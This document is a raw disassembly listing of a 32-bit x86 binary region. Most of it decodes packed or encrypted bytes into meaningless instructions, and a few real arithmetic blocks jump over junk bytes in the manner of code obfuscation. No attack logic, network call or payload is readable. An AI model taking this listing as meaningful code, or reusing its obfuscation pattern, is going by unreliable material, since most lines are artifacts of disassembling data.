  4094a2:	sahf   
  4094a3:	aas    
  4094a4:	ss invd 
  4094a7:	mov    DWORD PTR [eax-0x66],0x6f460d5
  4094ae:	cmp    edi,DWORD PTR [edx+0x67]
  4094b1:	xor    al,0x60
  4094b3:	add    esi,0x7d194024
  4094b9:	xchg   esp,eax
  4094ba:	mov    dh,0x48
  4094bc:	mov    bh,0x0
  4094be:	xor    bl,al
  4094c0:	loopne 0x40946c
  4094c2:	xchg   esp,eax
  4094c3:	push   eax
  4094c4:	inc    esi
  4094c5:	out    dx,al
  4094c6:	mov    bl,0x79
  4094c8:	inc    eax
  4094c9:	shl    DWORD PTR [ebx-0x3a2fd61d],0xab
  4094d0:	mov    cl,0x49
  4094d2:	lods   eax,DWORD PTR ds:[esi]
  4094d3:	xor    esp,DWORD PTR [edi+0x28ab7b5d]
  4094d9:	fsubr  DWORD PTR [edi+ecx*1-0x55]
  4094dd:	addr16 add dl,cl
  4094e0:	mov    eax,DWORD PTR [edi-0x3f]
  4094e3:	dec    ecx
  4094e4:	add    ebx,ebp
  4094e6:	xchg   edi,eax
  4094e7:	pop    eax
  4094e8:	or     eax,0xd33d1935
  4094ed:	add    esi,DWORD PTR [eax+ecx*2]
  4094f0:	mov    bh,0x6d
  4094f2:	xor    BYTE PTR [esi],bl
  4094f4:	inc    ecx
  4094f5:	fcom   st(1)
  4094f7:	push   edi
  4094f8:	inc    esp
  4094f9:	sar    BYTE PTR [esi-0x31f1c172],0xf6
  409500:	dec    edi
  409501:	mov    ds:0x2987a00e,eax
  409506:	adc    ah,dl
  409508:	enter  0x2018,0x36
  40950c:	inc    ebp
  40950d:	cmp    al,0x6a
  40950f:	jecxz  0x4094a9
  409511:	in     eax,0xca
  409513:	or     BYTE PTR [ecx],bh
  409515:	clc    
  409516:	jne    0x409535
  409518:	ja     0x40949a
  40951a:	or     BYTE PTR [edx+0x10],bh
  40951d:	and    ch,BYTE PTR [esi+esi*8]
  409520:	xlat   BYTE PTR ds:[ebx]
  409521:	dec    edx
  409522:	jle    0x40950d
  409524:	inc    esi
  409525:	or     eax,DWORD PTR [edi+0x78b659f1]
  40952b:	fs scas al,BYTE PTR es:[edi]
  40952d:	pusha  
  40952e:	inc    ecx
  40952f:	xchg   edi,eax
  409530:	mov    WORD PTR [ecx],gs
  409532:	sbb    dh,BYTE PTR [edi+0x732d8481]
  409538:	push   cs
  409539:	sahf   
  40953a:	mov    eax,0x2468e3ae
  40953f:	cvtps2pi mm0,QWORD PTR fs:[esi-0x47]
  409544:	scas   al,BYTE PTR es:[edi]
  409545:	cmp    ah,BYTE PTR [esi-0x4a]
  409548:	aam    0x37
  40954a:	aas    
  40954b:	dec    esi
  40954c:	inc    ebp
  40954d:	ret    
  40954e:	fidiv  DWORD PTR [edx*2-0x7e27bca0]
  409555:	lock xor BYTE PTR [edx-0xb51199a],dh
  40955c:	popf   
  40955d:	add    edx,DWORD PTR [esi+ebx*1-0x77725dcc]
  409564:	xchg   esi,eax
  409565:	or     eax,0xbbef6655
  40956a:	xor    edx,DWORD PTR [edx+0x7e69d5cf]
  409570:	aas    
  409571:	and    DWORD PTR [edi-0x4c543512],esi
  409577:	lock daa 
  409579:	out    dx,eax
  40957a:	pop    ecx
  40957b:	dec    edi
  40957c:	(bad)  
  40957d:	test   BYTE PTR ds:0x58cb8c3f,bh
  409583:	fild   DWORD PTR [edi+0x12]
  409586:	fmul   QWORD PTR [eax+0x760a095]
  40958c:	test   al,0xf8
  40958e:	nop
  40958f:	mov    ebp,0xe21b2f9c
  409594:	or     al,0x5a
  409596:	fnstcw WORD PTR [edx-0x39]
  409599:	mov    es,WORD PTR [eax-0x3b48926]
  40959f:	mov    eax,ds:0xae25cd9e
  4095a4:	jae    0x4095b0
  4095a6:	fwait
  4095a7:	cmp    eax,0x6de5e45c
  4095ac:	in     eax,0x7f
  4095ae:	jmp    0x2130e2ea
  4095b3:	add    al,0xd6
  4095b5:	ins    BYTE PTR es:[edi],dx
  4095b6:	das    
  4095b7:	cmc    
  4095b8:	inc    ebp
  4095b9:	dec    edx
  4095ba:	adc    ecx,DWORD PTR [edi+ecx*8+0x1b]
  4095be:	push   esp
  4095bf:	mov    edi,0xb176419c
  4095c4:	sbb    BYTE PTR [eax+0x76a1351c],cl
  4095ca:	rcl    BYTE PTR [ebx+0x236b7e3e],1
  4095d0:	add    ch,BYTE PTR [esi-0x53]
  4095d3:	mov    dh,0xde
  4095d5:	les    esp,FWORD PTR [eax-0x33]
  4095d8:	push   ebx
  4095d9:	in     al,0x45
  4095db:	in     al,dx
  4095dc:	lahf   
  4095dd:	inc    eax
  4095de:	mov    edx,0xd2e9e4b1
  4095e3:	xchg   edx,eax
  4095e4:	cwde   
  4095e5:	xchg   edx,edi
  4095e7:	sbb    edi,ebx
  4095e9:	sbb    al,0xb
  4095eb:	test   eax,0x17fcf679
  4095f0:	mov    ecx,0x93263e5d
  4095f5:	sub    edi,DWORD PTR [esi-0x40]
  4095f8:	sbb    ebp,DWORD PTR [eax]
  4095fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095fb:	push   esi
  4095fc:	jg     0x4095a5
  4095fe:	mov    DWORD PTR [ecx-0x7b29126d],ecx
  409604:	ins    BYTE PTR es:[edi],dx
  409605:	fbstp  TBYTE PTR [esi]
  409607:	lds    eax,FWORD PTR [edi]
  409609:	cmp    bl,BYTE PTR [eax-0x2e]
  40960c:	inc    ecx
  40960d:	popf   
  40960e:	popa   
  40960f:	push   ebp
  409610:	xor    eax,0x403d5690
  409615:	add    eax,0xc73f3cff
  40961a:	rcr    BYTE PTR [edx],1
  40961c:	sub    ah,cl
  40961e:	in     al,dx
  40961f:	ror    esi,0x93
  409622:	test   DWORD PTR [ebp-0x4567a6a5],ecx
  409628:	inc    DWORD PTR [esi-0x59]
  40962b:	inc    edi
  40962c:	mov    ch,dh
  40962e:	bnd jp 0x4095da
  409631:	fbld   TBYTE PTR [ecx-0x1d]
  409634:	add    edx,DWORD PTR [ebp-0x14]
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	nop
  409654:	and    DWORD PTR [edi+0x70e6f74c],ebp
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x40968c
  409660:	and    eax,0x5dac587c
  409665:	lock lods eax,DWORD PTR ds:[esi]
  409667:	js     0x409613
  409669:	imul   esp,DWORD PTR [edi],0xffffffa6
  40966c:	jae    0x409635
  40966e:	test   al,0xc4
  409670:	int    0x24
  409672:	into   
  409673:	pushf  
  409674:	aas    
  409675:	loope  0x4096ef
  409677:	cli    
  409678:	sub    BYTE PTR [ecx+0x19e9671f],0xbc
  40967f:	retf   
  409680:	adc    BYTE PTR [edi],bl
  409682:	push   ds
  409683:	dec    ebx
  409684:	iret   
  409685:	dec    eax
  409686:	scas   al,BYTE PTR es:[edi]
  409687:	loopne 0x40966d
  409689:	sub    BYTE PTR [ebx+0x188f14de],ch
  40968f:	adc    DWORD PTR [esp+ebp*1],esi
  409692:	or     eax,0x5d7c7f82
  409698:	inc    edx
  409699:	out    dx,eax
  40969a:	mov    ch,0xaa
  40969c:	lds    edx,FWORD PTR [ecx+ebx*8]
  40969f:	loopne 0x409698
  4096a1:	ss push esp
  4096a3:	mov    ah,0x10
  4096a5:	push   0x2a
  4096a7:	jmp    0x304e5552
  4096ac:	pop    ds
  4096ad:	fld    st(0)
  4096af:	aad    0xc3
  4096b1:	inc    esi
  4096b2:	or     esp,eax
  4096b4:	and    BYTE PTR ds:0xfcbac4a6,cl
  4096ba:	aas    
  4096bb:	mov    ebp,0x1097ea6d
  4096c0:	loop   0x4096aa
  4096c2:	leave  
  4096c3:	jg     0x409710
  4096c5:	pop    ebp
  4096c6:	push   ebx
  4096c7:	pusha  
  4096c8:	mov    ah,0x46
  4096ca:	into   
  4096cb:	add    al,0x6a
  4096cd:	imul   eax,DWORD PTR [eax+ebp*8+0x25],0x43
  4096d2:	push   ebx
  4096d3:	mov    cl,0x6d
  4096d5:	xor    DWORD PTR [ebx-0xff0ea0b],esp
  4096db:	stc    
  4096dc:	sub    DWORD PTR [edx-0x5f3d3e1e],edx
  4096e2:	and    ecx,ecx
  4096e4:	xchg   esi,eax
  4096e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096e6:	add    al,0x3e
  4096e8:	scas   eax,DWORD PTR es:[edi]
  4096e9:	pop    ebx
  4096ea:	mov    esp,DWORD PTR [ebx-0x696eda49]
  4096f0:	(bad)  
  4096f1:	push   eax
  4096f2:	xchg   BYTE PTR [eax-0x2a387cf1],ch
  4096f8:	push   eax
  4096f9:	imul   ebx,DWORD PTR [esi-0x74d58a8f],0xb9ad906a
  409703:	lods   al,BYTE PTR ds:[esi]
  409704:	call   0xd1d314a8
  409709:	inc    ecx
  40970a:	stos   BYTE PTR es:[edi],al
  40970b:	js     0x409763
  40970d:	push   gs
  40970f:	fsub   st,st(4)
  409711:	or     al,0xa2
  409713:	inc    edx
  409714:	mov    al,ds:0xda46037
  409719:	mov    bh,0xeb
  40971b:	xchg   edi,eax
  40971c:	enterw 0x3706,0x5f
  409721:	xchg   ebp,eax
  409722:	sub    BYTE PTR [edx+ecx*4+0x32ac3da5],al
  409729:	repz lahf 
  40972b:	outs   dx,DWORD PTR ds:[esi]
  40972c:	pop    esi
  40972d:	cli    
  40972e:	sub    ebp,0x22
  409731:	adc    DWORD PTR [edx],ecx
  409733:	and    esp,ebx
  409735:	dec    ebx
  409736:	inc    esp
  409737:	test   BYTE PTR [ecx+0x4bd68bdd],ah
  40973d:	pop    esi
  40973e:	cmp    BYTE PTR [eax],cl
  409740:	adc    DWORD PTR [edi+0x99c3c95],ebx
  409746:	mov    edx,0x56c0291d
  40974b:	or     DWORD PTR [eax],edx
  40974d:	arpl   WORD PTR [edi+0x65],ax
  409750:	test   al,0x7b
  409752:	ins    DWORD PTR es:[edi],dx
  409753:	mov    edx,0xe6e56d57
  409758:	dec    ecx
  409759:	adc    edx,DWORD PTR [ebp-0x28]
  40975c:	or     esi,DWORD PTR [ebx]
  40975e:	(bad)  
  40975f:	daa    
  409760:	aam    0xdd
  409762:	cmp    DWORD PTR ds:0xecf964d5,eax
  409768:	pop    ecx
  409769:	jg     0x40975a
  40976b:	es lock iret 
  40976e:	cs push edx
  409770:	pushf  
  409771:	mov    DWORD PTR [ecx+0x4],0xc5fde846
  409778:	push   eax
  409779:	add    edi,DWORD PTR [ebp+0x52]
  40977c:	imul   edx,DWORD PTR [edi],0xffffffc6
  40977f:	inc    edi
  409780:	xor    ebx,ecx
  409782:	inc    ebx
  409783:	push   ecx
  409784:	loop   0x40972a
  409786:	add    al,0xe
  409788:	into   
  409789:	push   ebx
  40978a:	loopne 0x409721
  40978c:	int3   
  40978d:	jne    0x4097bb
  40978f:	sar    ah,1
  409791:	dec    edx
  409792:	mov    ecx,0xa1368126
  409797:	pop    ecx
  409798:	mov    ah,0xe8
  40979a:	fstp   TBYTE PTR [edi+0x46]
  40979d:	xchg   BYTE PTR [ecx+0x300d77a1],dl
  4097a3:	mov    ds,esi
  4097a5:	ret    
  4097a6:	push   ss
  4097a7:	mov    BYTE PTR [ecx+0x4b],cl
  4097aa:	fsubr  QWORD PTR [ebp-0x4f]
  4097ad:	cli    
  4097ae:	mov    bl,0x97
  4097b0:	test   DWORD PTR [esi-0x7f5dbf8b],0xe6a23d9a
  4097ba:	sub    BYTE PTR [edi+ebx*8+0x10],dh
  4097be:	jnp    0x409800
  4097c0:	add    al,0xf7
  4097c2:	dec    esp
  4097c3:	pop    eax
  4097c4:	push   eax
  4097c5:	into   
  4097c6:	js     0x409810
  4097c8:	outs   dx,DWORD PTR ds:[esi]
  4097c9:	fst    DWORD PTR [esi+0x5dd1a100]
  4097cf:	es addr16 (bad) 
  4097d2:	sub    eax,DWORD PTR [edx]
  4097d4:	mov    WORD PTR [ecx-0x2f],?
  4097d7:	sahf   
  4097d8:	ins    DWORD PTR es:[edi],dx
  4097d9:	loopne 0x40984c
  4097db:	inc    esi
  4097dc:	push   esp
  4097dd:	mov    eax,ds:0xd07c1c98
  4097e2:	pusha  
  4097e3:	dec    eax
  4097e4:	or     bl,BYTE PTR [ecx]
  4097e6:	ins    BYTE PTR es:[edi],dx
  4097e7:	mov    bp,0x4491
  4097eb:	mov    ds:0xcab94a92,al
  4097f0:	cmp    bh,BYTE PTR [ecx+0x6bd21788]
  4097f6:	sahf   
  4097f7:	nop
  4097f8:	xor    BYTE PTR [ebx+0x7],dh
  4097fb:	add    esp,DWORD PTR [esi]
  4097fd:	mov    ebx,DWORD PTR ds:0xc9fff1ee
  409803:	clc    
  409804:	fistp  DWORD PTR [esi+0x22254275]
  40980a:	pop    esp
  40980b:	and    edx,eax
  40980d:	push   0x759d5aa8
  409812:	cdq    
  409813:	dec    esp
  409814:	call   0x1e72:0x72b1536c
  40981b:	lock loopne 0x4097e3
  40981e:	loope  0x4097b7
  409820:	jo     0x409838
  409822:	jp     0x40982b
  409824:	mov    eax,ds:0x5f55365f
  409829:	ror    cl,1
  40982b:	ret    0x694f
  40982e:	lea    eax,[edx+ecx*1]
  409831:	adc    ebp,ebx
  409833:	push   es
  409834:	inc    edx
  409835:	out    0x30,al
  409837:	outs   dx,BYTE PTR ds:[esi]
  409838:	fisubr DWORD PTR [ecx+eiz*4]
  40983b:	jnp    0x4097ce
  40983d:	or     ah,al
  40983f:	je     0x4097e0
  409841:	leave  
  409842:	fstp   TBYTE PTR [esi+0x7c2b3039]
  409848:	(bad)  
  409849:	clc    
  40984a:	mov    edx,0xda0b6c17
  40984f:	rcl    BYTE PTR [eax],1
  409851:	dec    ecx
  409852:	aam    0xb3
  409854:	fucomip st,st(2)
  409856:	add    edx,ecx
  409858:	imul   edx,edi
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x7bf628
  40989a:	dec    edx
  40989b:	shr    BYTE PTR [ebx+0x7070e4e0],0x69
  4098a2:	jg     0x409914
  4098a4:	jo     0x409847
  4098a6:	inc    edx
  4098a7:	mov    edi,0x2c3f6b4a
  4098ac:	mov    al,ch
  4098ae:	pop    edi
  4098af:	int    0xe9
  4098b1:	loope  0x4098da
  4098b3:	ss iret 
  4098b5:	and    al,0xe3
  4098b7:	inc    ecx
  4098b8:	xchg   DWORD PTR [esi-0x1],ebp
  4098bb:	out    dx,eax
  4098bc:	(bad)  
  4098be:	arpl   WORD PTR [ebp+0x3c46392e],bp
  4098c4:	mov    bl,0x45
  4098c6:	pop    eax
  4098c7:	pop    es
  4098c8:	jae    0x40985b
  4098ca:	fwait
  4098cb:	lods   eax,DWORD PTR ds:[esi]
  4098cc:	jnp    0x409895
  4098ce:	adc    ah,dl
  4098d0:	imul   ebp,DWORD PTR [esi-0x4c9c42e3],0x3f3e681
  4098da:	inc    esi
  4098db:	ja     0x4098c9
  4098dd:	xchg   DWORD PTR [eax+0x62],ebp
  4098e0:	and    al,0xd8
  4098e2:	lds    edi,FWORD PTR [ecx+0x68e5819c]
  4098e8:	adc    al,BYTE PTR [esi+edi*1+0x358022a2]
  4098ef:	shl    DWORD PTR [esi],cl
  4098f1:	xor    eax,0x8a029511
  4098f6:	sub    BYTE PTR ds:0xbded0482,bh
  4098fc:	mov    bh,0x13
  4098fe:	dec    ebx
  4098ff:	outs   dx,DWORD PTR ds:[esi]
  409900:	add    BYTE PTR [esi+0x49a09428],bl
  409906:	js     0x40992a
  409908:	jns    0x4098fe
  40990a:	sub    bh,BYTE PTR [edx+eiz*4-0x6a743f1b]
  409911:	pop    edx
  409912:	mov    ds:0x44607ef9,eax
  409917:	popf   
  409918:	(bad)  
  409919:	cmc    
  40991a:	jge    0x409980
  40991c:	inc    eax
  40991d:	bound  edi,QWORD PTR [edx-0x3d580fd8]
  409923:	(bad)  
  409924:	dec    esp
  409925:	push   eax
  409926:	pushf  
  409927:	and    bh,BYTE PTR [ecx+esi*1]
  40992a:	jge    0x4098f4
  40992c:	push   es
  40992d:	mov    gs,WORD PTR [eax-0x52511955]
  409933:	shl    DWORD PTR [eax+0x2b],0xa0
  409937:	clc    
  409938:	shl    ch,cl
  40993a:	leave  
  40993b:	scas   eax,DWORD PTR es:[edi]
  40993c:	or     al,0xbb
  40993e:	ss daa 
  409940:	xor    eax,esp
  409942:	xchg   esp,eax
  409943:	dec    eax
  409944:	and    edx,ebp
  409946:	in     al,0x2
  409948:	pop    esi
  409949:	dec    eax
  40994a:	pop    ss
  40994b:	cmp    ch,BYTE PTR [ebp+0x54b4d9bb]
  409951:	outs   dx,BYTE PTR ds:[esi]
  409952:	mov    bl,0x43
  409954:	xchg   sp,ax
  409956:	sbb    BYTE PTR [edi-0x4e7f73d8],dh
  40995c:	cmp    eax,0xca343dd4
  409961:	fmul   QWORD PTR [ebx]
  409963:	xor    al,0x7f
  409965:	jl     0x4098f0
  409967:	pop    esi
  409968:	clc    
  409969:	(bad)  
  40996a:	push   ebx
  40996b:	rcr    DWORD PTR [ecx],0xb6
  40996e:	mov    edx,0x7ad5de6f
  409973:	int    0xbb
  409975:	gs push edx
  409977:	sbb    ch,BYTE PTR [ebx-0x50]
  40997a:	xchg   ebp,eax
  40997b:	ret    0xca04
  40997e:	loop   0x40998e
  409980:	cwde   
  409981:	shl    bh,0xfd
  409984:	fidivr WORD PTR [esi+0x16]
  409987:	ret    
  409988:	daa    
  409989:	cmp    BYTE PTR [edi],0xc5
  40998c:	jge    0x40996d
  40998e:	(bad)  
  40998f:	neg    BYTE PTR [edi-0xb1d294f]
  409995:	adc    dl,BYTE PTR [ecx]
  409997:	or     eax,0xd3bea54c
  40999c:	mov    dl,0xd3
  40999e:	mov    edi,0x14a48c49
  4099a3:	popa   
  4099a4:	bound  eax,QWORD PTR [esi+edi*8+0x64]
  4099a8:	jecxz  0x4099f4
  4099aa:	icebp  
  4099ab:	adc    BYTE PTR ds:0x2d6d0279,al
  4099b1:	mov    al,0x3f
  4099b3:	dec    ebp
  4099b4:	in     eax,dx
  4099b5:	fdivr  DWORD PTR [edi+edx*2-0x59]
  4099b9:	adc    al,ah
  4099bb:	mov    dl,0x72
  4099bd:	rol    DWORD PTR [ebp-0x3e],cl
  4099c0:	cmp    BYTE PTR [edx+0x17],cl
  4099c3:	pop    esi
  4099c4:	sub    al,0xff
  4099c6:	mov    cl,0x99
  4099c8:	ds je  0x4099bd
  4099cb:	je     0x4099d8
  4099cd:	daa    
  4099ce:	mov    eax,DWORD PTR [ecx-0x17]
  4099d1:	addr16 lahf 
  4099d3:	jb     0x409964
  4099d5:	xchg   edi,eax
  4099d6:	fadd   QWORD PTR [esi+edx*1+0x47]
  4099da:	xchg   edx,eax
  4099db:	loope  0x4099da
  4099dd:	pop    ecx
  4099de:	and    DWORD PTR [edx],edx
  4099e0:	dec    BYTE PTR [eax+0x4488c4c5]
  4099e6:	dec    ecx
  4099e7:	int3   
  4099e8:	adc    BYTE PTR [ecx],ah
  4099ea:	mov    esi,DWORD PTR [edx-0x54]
  4099ed:	inc    esi
  4099ee:	add    ebx,DWORD PTR [eax+0x28712d4c]
  4099f4:	cs out 0xba,eax
  4099f7:	push   0x7154d049
  4099fc:	xchg   ebx,eax
  4099fd:	push   edi
  4099fe:	jnp    0x4099f8
  409a00:	int    0x55
  409a02:	sbb    BYTE PTR [ebx],dl
  409a04:	cmp    dh,bl
  409a06:	aam    0x4d
  409a08:	in     eax,0x79
  409a0a:	fisub  DWORD PTR [edi-0x15]
  409a0d:	xor    al,bl
  409a0f:	cmp    cl,BYTE PTR ds:0x5606602a
  409a15:	ins    BYTE PTR es:[edi],dx
  409a16:	lea    ebp,[ecx+0x68]
  409a19:	inc    edx
  409a1a:	jle    0x409a7b
  409a1c:	in     eax,0xac
  409a1e:	and    edx,edx
  409a20:	jne    0x4099d2
  409a22:	jecxz  0x409a73
  409a24:	mov    ch,0xe0
  409a26:	push   ebp
  409a27:	jae    0x4099fd
  409a29:	(bad)  
  409a2a:	nop
  409a2b:	add    dh,BYTE PTR [eax+0x24029ae1]
  409a31:	pop    edi
  409a32:	jle    0x409a25
  409a34:	inc    edi
  409a35:	sub    DWORD PTR [edx+0x6],edx
  409a38:	add    esp,edx
  409a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a3b:	fwait
  409a3c:	and    dh,BYTE PTR [esp+ebp*8]
  409a3f:	mov    ds,WORD PTR [esi-0x48]
  409a42:	cmp    BYTE PTR [edx+0x58d842f],ch
  409a48:	(bad)  
  409a49:	mov    al,ds:0x850e96c2
  409a4e:	sub    al,0xb6
  409a50:	adc    eax,0xb0899c16
  409a55:	shr    DWORD PTR [edi],cl
  409a57:	push   esi
  409a58:	jne    0x409aa1
  409a5a:	dec    esi
  409a5b:	jle    0x409ad9
  409a5d:	daa    
  409a5e:	mov    esp,0xaac16253
  409a63:	pop    eax
  409a64:	cld    
  409a65:	or     dh,BYTE PTR [ebx+0x42]
  409a68:	mov    esi,0x97ca87b
  409a6d:	(bad)  
  409a6e:	fmul   DWORD PTR [esi]
  409a70:	adc    DWORD PTR [ebp-0x5c777008],edx
  409a76:	jge    0x409a0d
  409a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a79:	in     al,0xec
  409a7b:	addr16 sbb cl,ah
  409a7e:	pop    esp
  409a7f:	bound  edi,QWORD PTR [eax+ebx*2-0xe]
  409a83:	mov    bl,0xa3
  409a85:	cmp    DWORD PTR [ecx+edi*1+0x2b],0xffffff8f
  409a8a:	sub    cl,ch
  409a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a8d:	and    ebx,ecx
  409a8f:	fst    DWORD PTR [ebx+0x4d]
  409a92:	jmp    0x409aaf
  409a94:	arpl   WORD PTR [eax+eiz*1],di
  409a97:	cli    
  409a98:	lock mov ebp,0x7d8b798f
  409a9e:	fdiv   QWORD PTR [ebx]
  409aa0:	rol    BYTE PTR [ebx],1
  409aa2:	ror    DWORD PTR [edi],1
  409aa4:	scas   eax,DWORD PTR es:[edi]
  409aa5:	xlat   BYTE PTR ds:[ebx]
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    al,BYTE PTR [ecx+0x19]
  409ad0:	or     DWORD PTR [ecx-0x27],edx
  409ad3:	loop   0x409b45
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409aa8
  409adb:	jne    0x409b10
  409add:	popf   
  409ade:	jmp    0x409adb
  409ae0:	mov    ch,0x22
  409ae2:	pop    ebp
  409ae3:	mov    DWORD PTR [esi+0x4],esp
  409ae6:	cmovp  ebp,DWORD PTR [ebx]
  409ae9:	fisubr WORD PTR [ebp+0x57]
  409aec:	mov    eax,0xdf24e27
  409af1:	push   ds
  409af2:	out    0x41,al
  409af4:	or     eax,0x646f9fe9
  409af9:	cmp    edi,esi
  409afb:	loopne 0x409b23
  409afd:	mov    edx,0xd97d10cc
  409b02:	repnz mov al,0x7f
  409b05:	inc    ebp
  409b06:	loopne 0x409aaa
  409b08:	nop
  409b09:	inc    edx
  409b0a:	push   eax
  409b0b:	jns    0x409aeb
  409b0d:	fmul   st,st(1)
  409b0f:	cmp    BYTE PTR [esi],0xec
  409b12:	std    
  409b13:	cmp    al,0x3d
  409b15:	pop    eax
  409b16:	icebp  
  409b17:	pop    ecx
  409b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b19:	cli    
  409b1a:	inc    esp
  409b1b:	sub    DWORD PTR [edi+eax*4+0x25043719],ebp
  409b22:	shl    BYTE PTR [ebx-0x52],0x92
  409b26:	ss int 0x77
  409b29:	sbb    BYTE PTR [edi-0x7389582d],al
  409b2f:	push   ecx
  409b30:	push   ecx
  409b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b32:	mov    esi,0x6e635ce7
  409b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b38:	dec    edx
  409b39:	mov    al,0x94
  409b3b:	cli    
  409b3c:	xchg   esi,eax
  409b3d:	dec    sp
  409b3f:	imul   esp,DWORD PTR [edx-0x5f2203e1],0xffffff9b
  409b46:	xor    BYTE PTR [esi],ch
  409b48:	or     dh,BYTE PTR [ecx]
  409b4a:	xchg   ebp,eax
  409b4b:	fidivr DWORD PTR [ecx+0x26]
  409b4e:	ret    0x390c
  409b51:	push   es
  409b52:	clc    
  409b53:	xchg   esp,eax
  409b54:	call   0xa6dd9ae5
  409b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b5a:	shr    BYTE PTR [edx+0x41],0xb
  409b5e:	xor    BYTE PTR [edx],0x18
  409b61:	xchg   DWORD PTR [esi+esi*1-0x55882b0c],ebp
  409b68:	xchg   esp,eax
  409b69:	dec    esp
  409b6a:	loop   0x409b4b
  409b6c:	and    al,0xe8
  409b6e:	jl     0x409bab
  409b70:	popa   
  409b71:	int3   
  409b72:	idiv   DWORD PTR [eax+0x7e]
  409b75:	les    ecx,FWORD PTR [eax]
  409b77:	jmp    0x1bc1:0xc680bc9a
  409b7e:	pushf  
  409b7f:	stc    
  409b80:	jbe    0x409b84
  409b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b83:	push   edi
  409b84:	aam    0x26
  409b86:	shr    cl,0xb2
  409b89:	adc    edx,DWORD PTR [esp+esi*2]
  409b8c:	sti    
  409b8d:	shl    BYTE PTR [edi-0x2],cl
  409b90:	cmp    BYTE PTR [ecx-0xfb5136a],bl
  409b96:	adc    DWORD PTR cs:[edx+0x72],esi
  409b9a:	stos   DWORD PTR es:[edi],eax
  409b9b:	test   ecx,0x1084e9ae
  409ba1:	fdiv   DWORD PTR [ecx-0x72b75a00]
  409ba7:	jg     0x409bcd
  409ba9:	std    
  409baa:	fisub  WORD PTR [ebp-0x6d9b798]
  409bb0:	adc    BYTE PTR [ebx],0x51
  409bb3:	outs   dx,DWORD PTR ds:[esi]
  409bb4:	add    edi,eax
  409bb6:	mov    ebx,0x70b56c99
  409bbb:	xor    esi,DWORD PTR [eax]
  409bbd:	add    edx,ecx
  409bbf:	pop    ebx
  409bc0:	pusha  
  409bc1:	loopne 0x409b84
  409bc3:	fwait
  409bc4:	clc    
  409bc5:	dec    ebx
  409bc6:	call   0x3e13:0x3943aa7b
  409bcd:	je     0x409bbb
  409bcf:	jmp    0xe9dc:0x34671e83
  409bd6:	(bad)  
  409bd7:	sbb    al,0x96
  409bd9:	in     al,0xf4
  409bdb:	in     eax,0x5e
  409bdd:	mov    BYTE PTR [ecx-0x24f8650b],bh
  409be3:	pop    eax
  409be4:	cdq    
  409be5:	add    eax,edi
  409be7:	stos   BYTE PTR es:[edi],al
  409be8:	adc    ecx,DWORD PTR [esi-0x60dba402]
  409bee:	adc    BYTE PTR [ebx-0x67],al
  409bf1:	gs loope 0x409ba0
  409bf4:	or     DWORD PTR [ecx],edx
  409bf6:	jne    0x409c05
  409bf8:	sbb    al,0xbd
  409bfa:	and    cl,bh
  409bfc:	pop    ds
  409bfd:	mov    dh,0xcb
  409bff:	xor    eax,0x6bb60858
  409c04:	push   edx
  409c05:	fbstp  TBYTE PTR [ebp+0x2789837a]
  409c0b:	mov    ecx,0x2be321e4
  409c10:	rcl    BYTE PTR [ebx+0x72],cl
  409c13:	repz les eax,FWORD PTR [esi+0x70]
  409c17:	xchg   edx,eax
  409c18:	ins    DWORD PTR es:[edi],dx
  409c19:	inc    ebx
  409c1a:	or     edx,DWORD PTR ds:0x1b40b09c
  409c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c21:	leave  
  409c22:	into   
  409c23:	mov    bh,0xc0
  409c25:	xchg   edi,eax
  409c26:	cmp    al,0x87
  409c28:	dec    esp
  409c29:	sar    esp,0xf2
  409c2c:	outs   dx,DWORD PTR ds:[esi]
  409c2d:	pop    ds
  409c2e:	jmp    DWORD PTR [edi+0x4c]
  409c31:	cmc    
  409c32:	push   ds
  409c33:	(bad)  
  409c34:	inc    ebp
  409c35:	and    al,0x3
  409c37:	pop    esi
  409c38:	(bad)  
  409c39:	lock inc eax
  409c3b:	push   esi
  409c3c:	iret   
